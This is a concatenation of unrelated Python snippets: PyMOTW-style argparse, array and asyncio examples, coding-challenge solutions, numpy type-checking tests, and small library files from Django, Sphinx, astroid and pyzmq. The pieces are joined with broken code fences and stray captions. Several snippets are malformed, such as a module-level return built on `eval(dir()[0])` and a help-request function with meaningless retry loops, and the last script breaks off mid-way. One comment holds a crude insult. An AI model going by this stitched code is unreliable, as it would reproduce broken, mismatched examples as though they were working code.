parser.add_argument("-a", action="store_false", default=None, help="Turn A off")
parser.add_argument("+a", action="store_true", default=None, help="Turn A on")
parser.add_argument("//noarg", "++noarg", action="store_true", default=False)

print(parser.parse_args())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(
    add_help=True,
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description="""
    description
        not
           wrapped""",
    epilog="""
    epilog
      not
         wrapped""",
)

parser.add_argument(
    "-a",
    action="store_true",
    help="""argument
    help is
    wrapped
    """,
)

parser.print_help()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(
    add_help=True,
    formatter_class=argparse.RawTextHelpFormatter,
    description="""
    description
        not
           wrapped""",
    epilog="""
    epilog
      not
         wrapped""",
)

parser.add_argument(
    "-a",
    action="store_true",
    help="""argument
    help is not
    wrapped
    """,
)

parser.print_help()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(description="Short sample app")

parser.add_argument("-a", action="store_true", default=False)
parser.add_argument("-b", action="store", dest="b")
parser.add_argument("-c", action="store", dest="c", type=int)

print(parser.parse_args(["-a", "-bval", "-c", "3"]))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser()

subparsers = parser.add_subparsers(help="commands")

# A list command
list_parser = subparsers.add_parser("list", help="List contents")
list_parser.add_argument("dirname", action="store", help="Directory to list")

# A create command
create_parser = subparsers.add_parser("create", help="Create a directory")
create_parser.add_argument("dirname", action="store", help="New directory to create")
create_parser.add_argument(
    "--read-only",
    default=False,
    action="store_true",
    help="Set permissions to prevent writing to the directory",
)

# A delete command
delete_parser = subparsers.add_parser("delete", help="Remove a directory")
delete_parser.add_argument("dirname", action="store", help="The directory to remove")
delete_parser.add_argument(
    "--recursive",
    "-r",
    default=False,
    action="store_true",
    help="Remove the contents of the directory, too",
)

print(parser.parse_args())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser()

parser.add_argument("-i", type=int)
parser.add_argument("-f", type=float)
parser.add_argument("--file", type=open)

try:
    print(parser.parse_args())
except IOError as msg:
    parser.error(str(msg))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyParent with shared options```


```py

# end_pymotw_header
import argparse
import argparse_parent_base

parser = argparse.ArgumentParser(parents=[argparse_parent_base.parser])

parser.add_argument("--local-arg", action="store_true", default=False)

print(parser.parse_args())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyParent with shared options```


```py

# end_pymotw_header
import argparse
import argparse_parent_with_group

parser = argparse.ArgumentParser(parents=[argparse_parent_with_group.parser])

parser.add_argument("--local-arg", action="store_true", default=False)

print(parser.parse_args())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(add_help=True)

parser.add_argument("-a", action="store_true", default=False)
parser.add_argument("-b", action="store", dest="b")
parser.add_argument("-c", action="store", dest="c", type=int)

print(parser.parse_args())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse
from configparser import ConfigParser
import shlex

parser = argparse.ArgumentParser(description="Short sample app")

parser.add_argument("-a", action="store_true", default=False)
parser.add_argument("-b", action="store", dest="b")
parser.add_argument("-c", action="store", dest="c", type=int)

config = ConfigParser()
config.read("argparse_with_shlex.ini")
config_value = config.get("cli", "options")
print("Config  :", config_value)

argument_list = shlex.split(config_value)
print("Arg List:", argument_list)

print("Results :", parser.parse_args(argument_list))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


# end_pymotw_header
import argparse

parser = argparse.ArgumentParser(add_help=False)

parser.add_argument("-a", action="store_true", default=False)
parser.add_argument("-b", action="store", dest="b")
parser.add_argument("-c", action="store", dest="c", type=int)

print(parser.parse_args())

#!/usr/bin/python
# -*- coding: utf-8 -*-


# *args is used when we don't know the exact number of
# arguments are going that will be passed, so this placeholder
# is used commonly


def add_numbers(*args):
    res = 0
    for i in args:
        res += i
    return res


# Quick Test
t1 = add_numbers(123, 435, 876, 12, 54, 76, 78954, 89, 87, 56, 78, 98, 56, 32, 87)
if t1 == sum([123, 435, 876, 12, 54, 76, 78954, 89, 87, 56, 78, 98, 56, 32, 87]):
    print("Sum: " + str(t1))
else:
    print("Something went wrong!")

#!/usr/bin/python
# -*- coding: utf-8 -*-


# *params is just a placeholder(try putting other name)
# for n number of arguments
# so that n can be any number, instead of params
# any name can be used, but the * asterisk is important

# Below function, is a generator
# generates a tuple containing arg, and a boolean value
# every time it encounters argument
def squared(*params):
    for arg in params:
        yield ((arg, arg % 2 == 0))


# Quick Test
print("Divisibility Test(by 2): ")
for n, bool_ in squared(12, 13, 34, 4576, 234536, 2341):
    if bool_:
        print("  [" + str(n) + "] -> is divisible by 2!")
    else:
        print("  [" + str(n) + "] -> is NOT divisible by 2!")

# i need help checking this function.
# args = 4 argument: 3 files and one list of letters.
# i need to check that filed are existing and that there are
# only 4 arguments. if a file is missing i need to print valueError
# this is what i got so far```


```py
def check_input_args(args):
    counter = 0
    for i in args:
        counter += 1
    while True:
        try:
            if counter != 4:
                break
        except ValueError:
            print('arguments amount is wrong')
    for arg in sys.argv[2:1]:
        while True:
            try:
                print(os.path.isfile(arg))
                break
            except ValueError:
                print(' file is missing')"""


import os
import sys


def check_input_args(*args):
    if len(args) > 4:
        print("Passed args are more than 4.")
        return

    # check each file
    for file in sys.argv[0:3]:
        if not os.path.isfile(file):
            raise ValueError
            return

import re

ERR_SIZE = "Error: Too many problems."
ERR_OP = "Error: Operator must be '+' or '-'."
ERR_NUM = "Error: Numbers must only contain digits."
ERR_LEN = "Error: Numbers cannot be more than four digits."


def arithmetic_arranger(problems, calc=False):
    """
    :type problems: list
    """
    if len(problems) > 5:
        return ERR_SIZE

    rex = re.compile(r"^[0-9]{1,4}$")

    formated = []

    for p in problems:
        [a, op, b] = p.split()

        # check the operator
        if op != "+" and op != "-":
            return ERR_OP

        if len(a) > 4 or len(b) > 4:
            return ERR_LEN

        if rex.match(a) is None or rex.match(b) is None:
            return ERR_NUM

        formated.append(fmt(a, op, b, calc))

    ss = formated[0]
    spaces = " " * 4
    for p in formated[1:]:
        for i in range(0, len(ss)):
            ss[i] += spaces + p[i]

    if not calc:
        ss = ss[0:3]

    return "\n".join(ss)


def fmt(a, op, b, calc):
    x = int(a)
    y = int(b)
    r = x + y if op == "+" else x - y
    base = r if r > 0 else 0 - r
    n = max([len(a), len(b), len(str(base))]) if calc else max([len(a), len(b)])

    r = str(r)
    n += 2  # for the op and a space
    res = [a.rjust(n), op + " " + b.rjust(n - 2), "-" * n]
    if calc:
        res.append(r.rjust(n))
    return res

def arithmeticExpression(a, b, c):
    """
    Consider an arithmetic expression of the form a#b=c.
    Check whether it is possible to replace # with one of
    the four signs: +, -, * or / to obtain a correct
    """
    return (
        True if (a + b == c) or (a - b == c) or (a * b == c) or (a / b == c) else False
    )

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Arithmetic progressions
# are special types of sets(more of a series)
# where the difference between every consecutive
# numbers of series is constant or common
# for more refer: https://en.wikipedia.org/wiki/Arithmetic_progression

# formula for general term of arithmetic prog.
# tn = a + (n - 1) * d
# where,
#    tn -> is the n(th) term,
#   a -> if the first term,
#    d -> is the common difference

# Third param 'n_last' refers to limit or length or index of last term


def arithmetic_p_sequence_builder(a, d, n_last):

    # To generate an A.P. length should be
    # greater than or equal to 1
    if n_last < 1:
        return -1

    seq = []

    # Every item is obtained by
    # applying the general term formula
    for n in range(1, n_last + 1):
        seq.append(a + (n - 1) * d)

    return seq


# Test
print(
    "Arithmetic progression: {}".format(
        arithmetic_p_sequence_builder(
            int(raw_input("A(a, first term): ")),
            int(raw_input("D(d, common difference): ")),
            int(raw_input("N(n, length): ")),
        )
    )
)

# Although big line, but works just fine!

num = int(input("Enter a number:"))
sum = 0
temp = num
while temp > 0:
    digit = temp % 10
    sum += digit ** 3
    temp //= 10
if num == sum:
    print(num, "is an Armstrong number")
else:
    print(num, "is not an Armstrong number")

# Python program to check if the number is an Armstrong number or not

# take input from the user
num = int(input("Enter a number: "))

# initialize sum
sum = 0

# find the sum of the cube of each digit
temp = num
while temp > 0:
    digit = temp % 10
    sum += digit ** 3
    temp //= 10

# display the result
if num == sum:
    print(num, "is an Armstrong number")
else:
    print(num, "is not an Armstrong number")

def transform_array(array, f):
    """Args; 2D array e.g. [[2,2],[2,2]],
    f = function e.g lambda x: x*2
    return [[4,4], [4,4]]"""

    height = len(array)
    width = len(array[0])

    for col in range(width):
        for row in range(height):
            val = array[row][col]
            array[row][col] = f(val)

    return array


# # test
# # this works
# array = [[2, 2], [2, 2]]


# def f(x): return x * 2


# print(transform_array(array, f))
# try this


# Commentary
# Instead of having to use a function as a parameter (f)
# in transform_array(array, f)
# I want to make a nested function below,
# which substitue parameter f


def num_multiply(array, n):
    """Args; array - 2d Array [[2,2],[2,2]], n = number to
    mulitply with, just want to change the array"""

    def num2(x):
        return n * x

    # return num_multiply(array, n) ?

    return transform_array(array, num2)


# I just want to change my array


# TEST
array = [[1, 1], [-1, -1]]
n = 2
print(num_multiply(array, n))

# Expected changed list is [[2,2], [-2,2]]

def arrayChange(inputArray):

    moves = 0

    for i in range(len(inputArray) - 1):

        left = inputArray[i]
        right = inputArray[i + 1]

        if left >= right:
            tmp_moves = left - right + 1
            inputArray[i + 1] += tmp_moves
            moves += tmp_moves

    return moves

# Nique toi Sylvere

L, = eval(dir()[0])
s = 0


while len(L) > 1:
    L = (
        numpy.add(L[:-1:2], L[1::2])
        if s % 2 == 0
        else numpy.multiply(L[:-1:2], L[1::2])
    )
    s += 1

return L[0]

L, = eval(dir()[0])
s = 0


while len(L) > 1:
    L = (
        numpy.add(L[:-1:2], L[1::2])
        if s % 2 == 0
        else numpy.multiply(L[:-1:2], L[1::2])
    )
    s += 1

return L[0]

# Stack implementation using Array in Python
# Stack Methods : push, pop, peek, isEmpty

from sys import maxsize


def initializeStack():
    stack = []
    return stack


def isEmpty(stack):
    if len(stack) == 0:
        return True
    else:
        return False


def pop(stack):
    if isEmpty(stack):
        return str(-maxsize - 1)
    return stack.pop()


def push(item, stack):
    stack.append(item)
    print(str(item) + " pushed into stack")


def peek(stack):
    if isEmpty(stack):
        return str(-maxsize - 1)
    return stack[len(stack) - 1]


# Driver code to test the functions
stack = initializeStack()
push(3, stack)
push(4, stack)
push(5, stack)
print(peek(stack))
print(pop(stack))

```









---


```py


# end_pymotw_header
import array
import binascii


def to_hex(a):
    chars_per_item = a.itemsize * 2  # 2 hex digits
    hex_version = binascii.hexlify(a)
    num_chunks = len(hex_version) // chars_per_item
    for i in range(num_chunks):
        start = i * chars_per_item
        end = start + chars_per_item
        yield hex_version[start:end]


start = int("0x12345678", 16)
end = start + 5
a1 = array.array("i", range(start, end))
a2 = array.array("i", range(start, end))
a2.byteswap()

fmt = "{:>12} {:>12} {:>12} {:>12}"
print(fmt.format("A1 hex", "A1", "A2 hex", "A2"))
print(fmt.format("-" * 12, "-" * 12, "-" * 12, "-" * 12))
fmt = "{!r:>12} {:12} {!r:>12} {:12}"
for values in zip(to_hex(a1), a1, to_hex(a2), a2):
    print(fmt.format(*values))

def arrayChange(inputArray):
    moves = 0
    current = inputArray[0]
    for number in inputArray[1:]:
        if number <= current:
            moves += current - number + 1
            current += 1
        else:
            current = number
    return moves

import numpy as np

a: np.ndarray
generator = (i for i in range(10))

np.require(a, requirements=1)  # E: No overload variant
np.require(a, requirements="TEST")  # E: incompatible type

np.zeros("test")  # E: incompatible type
np.zeros()  # E: Missing positional argument

np.ones("test")  # E: incompatible type
np.ones()  # E: Missing positional argument

np.array(0, float, True)  # E: Too many positional

np.linspace(None, "bob")  # E: No overload variant
np.linspace(0, 2, num=10.0)  # E: No overload variant
np.linspace(0, 2, endpoint="True")  # E: No overload variant
np.linspace(0, 2, retstep=b"False")  # E: No overload variant
np.linspace(0, 2, dtype=0)  # E: No overload variant
np.linspace(0, 2, axis=None)  # E: No overload variant

np.logspace(None, "bob")  # E: Argument 1
np.logspace(0, 2, base=None)  # E: Argument "base"

np.geomspace(None, "bob")  # E: Argument 1

np.stack(generator)  # E: No overload variant
np.hstack({1, 2})  # E: incompatible type
np.vstack(1)  # E: incompatible type

```









---


```py



# end_pymotw_header
import array
import binascii
import tempfile

a = array.array("i", range(5))
print("A1:", a)

# Write the array of numbers to a temporary file
output = tempfile.NamedTemporaryFile()
a.tofile(output.file)  # must pass an *actual* file
output.flush()

# Read the raw data
with open(output.name, "rb") as input:
    raw_data = input.read()
    print("Raw Contents:", binascii.hexlify(raw_data))

    # Read the data into an array
    input.seek(0)
    a2 = array.array("i")
    a2.fromfile(input, len(a))
    print("A2:", a2)

import numpy as np
from numpy.typing import ArrayLike


class A:
    pass


x1: ArrayLike = (i for i in range(10))  # E: Incompatible types in assignment
x2: ArrayLike = A()  # E: Incompatible types in assignment
x3: ArrayLike = {1: "foo", 2: "bar"}  # E: Incompatible types in assignment

scalar = np.int64(1)
scalar.__array__(dtype=np.float64)  # E: No overload variant
array = np.array([1])
array.__array__(dtype=np.float64)  # E: No overload variant

def maxSum(arr, n, k):

    # k must be greater
    if n < k:

        print("Invalid")
        return -1

    # Compute sum of first
    # window of size k
    res = 0
    for i in range(k):
        res += arr[i]

    # Compute sums of remaining windows by
    # removing first element of previous
    # window and adding last element of
    # current window.
    curr_sum = res
    for i in range(k, n):

        curr_sum += arr[i] - arr[i - k]
        res = max(res, curr_sum)

    return res


def arrayMaxConsecutiveSum(inputArray, k):
    """Find maximal possible sum of k consecutive elements in list of integers

    Args:
        intputArray(int): List of integers
        k(int): Number of consecutive elements

    Return
        Maximum sum of k consecutive elements

    Raises:
    """
    return maxSum(inputArray, len(inputArray), k)

def arrayMaximalAdjacentDifference(inputArray):
    max_diff = -15
    for i in range(len(inputArray) - 1):
        max_diff = max(abs(inputArray[i] - inputArray[i + 1]), max_diff)
    return max_diff

def arrayReplace(inputArray, elemToReplace, substitutionElem):
    for i in range(len(inputArray)):
        if inputArray[i] == elemToReplace:
            inputArray[i] = substitutionElem
    return inputArray

```









---


```py


# end_pymotw_header
import array
import pprint

a = array.array("i", range(3))
print("Initial :", a)

a.extend(range(3))
print("Extended:", a)

print("Slice   :", a[2:5])

print("Iterator:")
print(list(enumerate(a)))

```









---


```py


# end_pymotw_header
import array
import binascii

s = b"This is the array."
a = array.array("b", s)

print("As byte string:", s)
print("As array      :", a)
print("As hex        :", binascii.hexlify(a))
````

````py
Given an array where elements are sorted in ascending order,
convert it to a height balanced BST.```


```py


class TreeNode(object):
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


def array_to_bst(nums):
    if not nums:
        return None
    mid = len(nums) // 2
    node = TreeNode(nums[mid])
    node.left = array_to_bst(nums[:mid])
    node.right = array_to_bst(nums[mid + 1 :])
    return node

```









---


```py


# end_pymotw_header
import array
import binascii

a = array.array("i", range(5))
print("A1:", a)

as_bytes = a.tobytes()
print("Bytes:", binascii.hexlify(as_bytes))

a2 = array.array("i")
a2.frombytes(as_bytes)
print("A2:", a2)

from typing import Callable, Any
import numpy as np

AR: np.ndarray
func1: Callable[[Any], str]
func2: Callable[[np.integer[Any]], str]

np.array2string(AR, style=None)  # E: Unexpected keyword argument
np.array2string(AR, legacy="1.14")  # E: incompatible type
np.array2string(AR, sign="*")  # E: incompatible type
np.array2string(AR, floatmode="default")  # E: incompatible type
np.array2string(AR, formatter={"A": func1})  # E: incompatible type
np.array2string(AR, formatter={"float": func2})  # E: Incompatible types

def areSimilar(a, b):

    left = None
    right = None

    areSimilar = True

    mism = 0
    for i in range(len(a)):

        if a[i] != b[i]:
            mism += 1
        else:
            continue

        if mism == 1:
            left = a[i]
            right = b[i]
        elif mism == 2:
            if left == b[i] and right == a[i]:
                continue
            else:
                return False
        elif mism > 2:
            areSimilar = False
            break

    return areSimilar

from __future__ import annotations

from typing import Any
import numpy as np

AR_i8: np.ndarray[Any, np.dtype[np.int_]] = np.arange(10)
ar_iter = np.lib.Arrayterator(AR_i8)

ar_iter.var
ar_iter.buf_size
ar_iter.start
ar_iter.stop
ar_iter.step
ar_iter.shape
ar_iter.flat

ar_iter.__array__()

for i in ar_iter:
    pass

ar_iter[0]
ar_iter[...]
ar_iter[:]
ar_iter[0, 0, 0]
ar_iter[..., 0, :]

# Finding Articulation Points in Undirected Graph
def computeAP(l):  # noqa: E741
    n = len(l)
    outEdgeCount = 0
    low = [0] * n
    visited = [False] * n
    isArt = [False] * n

    def dfs(root, at, parent, outEdgeCount):
        if parent == root:
            outEdgeCount += 1
        visited[at] = True
        low[at] = at

        for to in l[at]:
            if to == parent:
                pass
            elif not visited[to]:
                outEdgeCount = dfs(root, to, at, outEdgeCount)
                low[at] = min(low[at], low[to])

                # AP found via bridge
                if at < low[to]:
                    isArt[at] = True
                # AP found via cycle
                if at == low[to]:
                    isArt[at] = True
            else:
                low[at] = min(low[at], to)
        return outEdgeCount

    for i in range(n):
        if not visited[i]:
            outEdgeCount = 0
            outEdgeCount = dfs(i, i, -1, outEdgeCount)
            isArt[i] = outEdgeCount > 1

    for x in range(len(isArt)):
        if isArt[x] is True:
            print(x)


# Adjacency list of graph
data = {
    0: [1, 2],
    1: [0, 2],
    2: [0, 1, 3, 5],
    3: [2, 4],
    4: [3],
    5: [2, 6, 8],
    6: [5, 7],
    7: [6, 8],
    8: [5, 7],
}
computeAP(data)
````

````py
ASCII

Conversions from ASCII to:
  - base2
  - base16

Author: Ian Doarn```


```py
from pygorithm.binary.binary_utils import pad
from pygorithm.binary.base10 import to_base2 as b10_to_b2
from pygorithm.binary.base2 import to_base16 as b2_to_b16, to_ascii as b2_to_ascii


def to_base16(string, visualize=False):
    """
    Convert ascii to hexadecimal
    :param string: string to convert
    :param visualize: Show process
    :param as_string: return value as string not array
    :return: hex representation of given string
    """
    hex_array = []

    for b_value in to_base2(string):
        if visualize:
            print("{} -> {}".format(b2_to_ascii(b_value), b2_to_b16(b_value)))
        hex_array.append(b2_to_b16(b_value))

    return hex_array


def to_base2(string, visualize=False, as_string=False):
    """
    Convert ascii string to binary
    :param string: Ascii string
    :param visualize: Show process
    :param as_string: join strings with a space as one large value
    :return: array of binary numbers, or entire string
    """
    _list = []
    for x in string:
        if visualize:
            print("{} -> {} -> {}".format(x, str(ord(x)), str(b10_to_b2(ord(x)))))
        value = pad(str(b10_to_b2(ord(x))))
        _list.append(value)

    if as_string:
        return " ".join(_list)
    return _list
````

````py
ASGI config for distance_proj project.

It exposes the ASGI callable as a module-level variable named ``application``.

For more information on this file, see
https://docs.djangoproject.com/en/3.0/howto/deployment/asgi/```


```py

import os

from django.core.asgi import get_asgi_application

os.environ.setdefault("DJANGO_SETTINGS_MODULE", "distance_proj.settings")

application = get_asgi_application()
````

````py
    sphinx.environment.adapters.asset
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Assets adapter for sphinx.environment.

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from sphinx.environment import BuildEnvironment


class ImageAdapter:
    def __init__(self, env: BuildEnvironment) -> None:
        self.env = env

    def get_original_image_uri(self, name: str) -> str:
        """Get the original image URI."""
        while name in self.env.original_image_uri:
            name = self.env.original_image_uri[name]

        return name
````

````py
This file contain the global astroid MANAGER, to prevent circular import that happened
when the only possibility to import it was from astroid.__init__.py.

This AstroidManager is a singleton/borg so it's possible to instantiate an
AstroidManager() directly.```


```py

# Licensed under the LGPL: https://www.gnu.org/licenses/old-licenses/lgpl-2.1.en.html
# For details: https://github.com/PyCQA/astroid/blob/main/LICENSE


from astroid.manager import AstroidManager

MANAGER = AstroidManager()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading
import asyncio


@asyncio.coroutine
def hello():
    print("Hello world! (%s)" % threading.currentThread())
    yield from asyncio.sleep(1)
    print("Hello again! (%s)" % threading.currentThread())


loop = asyncio.get_event_loop()
tasks = [hello(), hello()]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading
import asyncio


async def hello():
    print("Hello world! (%s)" % threading.currentThread())
    await asyncio.sleep(1)
    print("Hello again! (%s)" % threading.currentThread())


loop = asyncio.get_event_loop()
tasks = [hello(), hello()]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio


@asyncio.coroutine
def wget(host):
    print("wget %s..." % host)
    connect = asyncio.open_connection(host, 80)
    reader, writer = yield from connect
    header = "GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % host
    writer.write(header.encode("utf-8"))
    yield from writer.drain()
    while True:
        line = yield from reader.readline()
        if line == b"\r\n":
            break
        print("%s header > %s" % (host, line.decode("utf-8").rstrip()))
    # Ignore the body, close the socket
    writer.close()


loop = asyncio.get_event_loop()
tasks = [wget(host) for host in ["www.sina.com.cn", "www.sohu.com", "www.163.com"]]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading
import asyncio


async def hello():
    print("Hello world! (%s)" % threading.currentThread())
    await asyncio.sleep(1)
    print("Hello again! (%s)" % threading.currentThread())


loop = asyncio.get_event_loop()
tasks = [hello(), hello()]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()
````

````pyZAP Authenticator integrated with the asyncio IO loop.

.. versionadded:: 15.2```


```py

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

import asyncio

import zmq
from zmq.asyncio import Poller
from .base import Authenticator


class AsyncioAuthenticator(Authenticator):
    """ZAP authentication for use in the asyncio IO loop"""

    def __init__(self, context=None, loop=None):
        super().__init__(context)
        self.loop = loop or asyncio.get_event_loop()
        self.__poller = None
        self.__task = None

    async def __handle_zap(self):
        while True:
            events = await self.__poller.poll()
            if self.zap_socket in dict(events):
                msg = await self.zap_socket.recv_multipart()
                self.handle_zap_message(msg)

    def start(self):
        """Start ZAP authentication"""
        super().start()
        self.__poller = Poller()
        self.__poller.register(self.zap_socket, zmq.POLLIN)
        self.__task = asyncio.ensure_future(self.__handle_zap())

    def stop(self):
        """Stop ZAP authentication"""
        if self.__task:
            self.__task.cancel()
        if self.__poller:
            self.__poller.unregister(self.zap_socket)
            self.__poller = None
        super().stop()


__all__ = ["AsyncioAuthenticator"]

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyDealing with individual background tasks as they finish```


```py

# end_pymotw_header
import asyncio


async def phase(i):
    print("in phase {}".format(i))
    await asyncio.sleep(0.5 - (0.1 * i))
    print("done with phase {}".format(i))
    return "phase {} result".format(i)


async def main(num_phases):
    print("starting main")
    phases = [phase(i) for i in range(num_phases)]
    print("waiting for phases to complete")
    results = []
    for next_to_complete in asyncio.as_completed(phases):
        answer = await next_to_complete
        print("received answer {!r}".format(answer))
        results.append(answer)
    print("results: {!r}".format(results))
    return results


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(3))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyScheduling a callback with call_at```


```py

# end_pymotw_header
import asyncio
import time


def callback(n, loop):
    print("callback {} invoked at {}".format(n, loop.time()))


async def main(loop):
    now = loop.time()
    print("clock time: {}".format(time.time()))
    print("loop  time: {}".format(now))

    print("registering callbacks")
    loop.call_at(now + 0.2, callback, 1, loop)
    loop.call_at(now + 0.1, callback, 2, loop)
    loop.call_soon(callback, 3, loop)

    await asyncio.sleep(1)


event_loop = asyncio.get_event_loop()
try:
    print("entering event loop")
    event_loop.run_until_complete(main(event_loop))
finally:
    print("closing event loop")
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyScheduling a callback with call_later```


```py

# end_pymotw_header
import asyncio


def callback(n):
    print("callback {} invoked".format(n))


async def main(loop):
    print("registering callbacks")
    loop.call_later(0.2, callback, 1)
    loop.call_later(0.1, callback, 2)
    loop.call_soon(callback, 3)

    await asyncio.sleep(0.4)


event_loop = asyncio.get_event_loop()
try:
    print("entering event loop")
    event_loop.run_until_complete(main(event_loop))
finally:
    print("closing event loop")
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyScheduling a callback with call_soon```


```py

# end_pymotw_header
import asyncio
import functools


def callback(arg, *, kwarg="default"):
    print("callback invoked with {} and {}".format(arg, kwarg))


async def main(loop):
    print("registering callbacks")
    loop.call_soon(callback, 1)
    wrapped = functools.partial(callback, kwarg="not default")
    loop.call_soon(wrapped, 2)

    await asyncio.sleep(0.1)


event_loop = asyncio.get_event_loop()
try:
    print("entering event loop")
    event_loop.run_until_complete(main(event_loop))
finally:
    print("closing event loop")
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyStarting a task, then canceling it```


```py

# end_pymotw_header
import asyncio


async def task_func():
    print("in task_func")
    return "the result"


async def main(loop):
    print("creating task")
    task = loop.create_task(task_func())

    print("canceling task")
    task.cancel()

    print("canceled task {!r}".format(task))
    try:
        await task
    except asyncio.CancelledError:
        print("caught error from canceled task")
    else:
        print("task result: {!r}".format(task.result()))


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(event_loop))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyStarting a task, then canceling it```


```py

# end_pymotw_header
import asyncio


async def task_func():
    print("in task_func, sleeping")
    try:
        await asyncio.sleep(1)
    except asyncio.CancelledError:
        print("task_func was canceled")
        raise
    return "the result"


def task_canceller(t):
    print("in task_canceller")
    t.cancel()
    print("canceled the task")


async def main(loop):
    print("creating task")
    task = loop.create_task(task_func())
    loop.call_soon(task_canceller, task)
    try:
        await task
    except asyncio.CancelledError:
        print("main() also sees task as canceled")


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(event_loop))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyUsing a condition primitive```


```py

# end_pymotw_header
import asyncio


async def consumer(condition, n):
    async with condition:
        print("consumer {} is waiting".format(n))
        await condition.wait()
        print("consumer {} triggered".format(n))
    print("ending consumer {}".format(n))


async def manipulate_condition(condition):
    print("starting manipulate_condition")

    # pause to let consumers start
    await asyncio.sleep(0.1)

    for i in range(1, 3):
        async with condition:
            print("notifying {} consumers".format(i))
            condition.notify(n=i)
        await asyncio.sleep(0.1)

    async with condition:
        print("notifying remaining consumers")
        condition.notify_all()

    print("ending manipulate_condition")


async def main(loop):
    # Create a condition
    condition = asyncio.Condition()

    # Set up tasks watching the condition
    consumers = [consumer(condition, i) for i in range(5)]

    # Schedule a task to manipulate the condition variable
    loop.create_task(manipulate_condition(condition))

    # Wait for the consumers to be done
    await asyncio.wait(consumers)


event_loop = asyncio.get_event_loop()
try:
    result = event_loop.run_until_complete(main(event_loop))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyStarting a coroutine```


```py

# end_pymotw_header
import asyncio


async def coroutine():
    print("in coroutine")


event_loop = asyncio.get_event_loop()
try:
    print("starting coroutine")
    coro = coroutine()
    print("entering event loop")
    event_loop.run_until_complete(coro)
finally:
    print("closing event loop")
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyStarting one coroutine from within another```


```py

# end_pymotw_header
import asyncio


async def outer():
    print("in outer")
    print("waiting for result1")
    result1 = await phase1()
    print("waiting for result2")
    result2 = await phase2(result1)
    return (result1, result2)


async def phase1():
    print("in phase1")
    return "result1"


async def phase2(arg):
    print("in phase2")
    return "result2 derived from {}".format(arg)


event_loop = asyncio.get_event_loop()
try:
    return_value = event_loop.run_until_complete(outer())
    print("return value: {!r}".format(return_value))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyReturning a value from a coroutine```


```py

# end_pymotw_header
import asyncio


async def coroutine():
    print("in coroutine")
    return "result"


event_loop = asyncio.get_event_loop()
try:
    return_value = event_loop.run_until_complete(coroutine())
    print("it returned: {!r}".format(return_value))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyStarting a task```


```py

# end_pymotw_header
import asyncio


async def task_func():
    print("in task_func")
    return "the result"


async def main(loop):
    print("creating task")
    task = loop.create_task(task_func())
    print("waiting for {!r}".format(task))
    return_value = await task
    print("task completed {!r}".format(task))
    print("return value: {!r}".format(return_value))


event_loop = asyncio.get_event_loop()
try:
    event_loop.run_until_complete(main(event_loop))
finally:
    event_loop.close()

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.```


```pyEnabling debugging```


```py

# end_pymotw_header
import argparse
import asyncio
import logging
import sys
import time
import warnings

parser = argparse.ArgumentParser("debugging asyncio")
parser.add_argument("-v", dest="verbose", default=False, action="store_true")
args = parser.parse_args()

logging.basicConfig(
    level=logging.DEBUG, format="%(levelname)7s: %(message)s", stream=sys.stderr
)
LOG = logging.getLogger("")


async def inner():
    LOG.info("inner starting")
    # Use a blocking sleep to simulate
    # doing work inside the function.
    time.sleep(0.1)
    LOG.info("inner completed")


async def outer(loop):
    LOG.info("outer starting")
    await asyncio.ensure_future(loop.create_task(inner()))
    LOG.info("outer completed")


event_loop = asyncio.get_event_loop()
if args.verbose:
    LOG.info("enabling debugging")

    # Enable debugging
    event_loop.set_debug(True)

